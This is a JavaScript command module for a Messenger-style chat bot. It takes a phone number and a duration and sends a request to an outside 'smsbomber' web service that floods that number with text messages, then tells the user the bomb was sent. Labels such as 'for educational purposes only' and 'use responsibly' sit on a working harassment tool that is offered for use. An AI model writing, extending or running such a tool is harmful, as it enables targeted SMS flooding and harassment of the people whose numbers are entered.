const axios = require('axios');
const { sendMessage } = require('../handles/sendMessage');

module.exports = {
  name: 'smsbomb',
  description: 'Send SMS bomb to a target number (for educational purposes only).',
  usage: 'smsbomb <number> | <seconds> (or without spaces)',
  author: 'chill',

  async execute(senderId, args, pageAccessToken) {
    const input = args.join(' ');

    // Regular expression to match number and seconds with or without spaces
    const regex = /(\d+)\s*\|\s*(\d+)/;
    const match = input.match(regex);

    if (!match) {
      await sendMessage(senderId, {
        text: `🚨 Invalid Format! 🚨\n\nPlease use the correct format: smsbomb <number> | <seconds>\nExample: smsbomb 09123456789 | 20`
      }, pageAccessToken);
      return;
    }

    const number = match[1];
    const seconds = parseInt(match[2]);

    if (seconds > 90) {
      await sendMessage(senderId, {
        text: `⚠️ Error: Seconds must be limited to 90 seconds to prevent abuse. 🚫\n\nPlease try again with a duration of 90 seconds or less.`
      }, pageAccessToken);
      return;
    }

    try {
      const response = await axios.get(`https://smsbomber.up.railway.app/bomb?number=${number}&seconds=${seconds}`);

      if (response.data.message) {
        await sendMessage(senderId, {
          text: `🚀 SMS bomb sent successfully to ${number} for ${seconds} seconds! 🚀\n\nRemember, use responsibly.`
        }, pageAccessToken);
      } else if (response.data.error) {
        if (response.data.error.includes('Don\'t spam!')) {
          await sendMessage(senderId, {
            text: `😅 Error: ${response.data.error}\n\nPlease try again later or check the API status.`
          }, pageAccessToken);
        } else if (response.data.error.includes('Seconds must be limit at 90 seconds')) {
          await sendMessage(senderId, {
            text: `⚠️ Error: ${response.data.error}\n\nPlease adjust the duration to 90 seconds or less.`
          }, pageAccessToken);
        } else {
          await sendMessage(senderId, {
            text: `🚫 Error: ${response.data.error}\n\nPlease try again or check the API status.`
          }, pageAccessToken);
        }
      } else {
        throw new Error('Invalid API response.');
      }
    } catch (error) {
      console.error('Error sending SMS bomb:', error.message || error);
      await sendMessage(senderId, {
        text: `🚫 Failed to send SMS bomb. Please try again or check the API status.`
      }, pageAccessToken);
    }
  }
};
